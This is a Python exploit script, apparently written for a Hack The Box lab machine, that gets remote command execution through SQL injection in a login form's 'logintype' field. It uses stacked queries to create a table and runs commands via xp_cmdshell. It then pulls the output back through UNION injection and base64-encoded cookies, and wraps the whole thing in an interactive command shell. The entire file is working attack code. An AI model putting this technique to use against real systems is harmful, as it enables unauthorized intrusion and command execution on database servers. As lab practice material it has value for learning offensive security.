from cmd import Cmd
import requests
from base64 import b64decode
from urllib.parse import unquote

class fighter():
    def __init__(self,proxy='http://127.0.0.1:8080'):
        self.url = 'http://members.streetfighterclub.htb/old/verify.asp'
        self.proxies = {'http':proxy}
        self.create_table = "1;create table gg(id int identity(1,1) PRIMARY KEY,out varchar(2000)) -- -"
        self.truncate = "1;truncate table gg -- -"
        self.count = "1 union select 1,2,3,4,(select count (*) from gg),6"
        #self.postreq(self.truncate)
        self.postreq(self.create_table)

    def postreq(self,arg):
        datum = {'username':'admin','password':'admin','logintype':arg,'rememberme':'ON','B1':'LogIn'}
        return requests.post(self.url, proxies=self.proxies, allow_redirects=False, data=datum)

    def runcmd(self,cmd):
        self.postreq(self.truncate)
        self.postreq(f"1;insert into gg (out) exec Xp_CmdShell '{cmd}';-- -")
        self.output()
    
    def decode_cookie(self, cookies):
        #print(type(cookies))
        #print (unquote(cookies['Email']))
        return b64decode(unquote(cookies['Email']))
    
    def output(self):
        z = self.postreq(self.count)
        c = int(self.decode_cookie(z.cookies))
        for i in range(1,c):
            line = self.postreq(f"1 union select 1,2,3,4,(select out from gg where id={i}),6 -- -")
            try:
                print ((self.decode_cookie(line.cookies).decode()))
            except:
                None

o = fighter()
#while True:
    #cmd = input("CMD >")
    #o.runcmd(cmd)
class Terminal(Cmd,fighter):
    prompt = "CMD >"
    def default(self,args):
        o = fighter()
        args = args.replace("'","''")
        o.runcmd(args)
term = Terminal()
term.cmdloop()
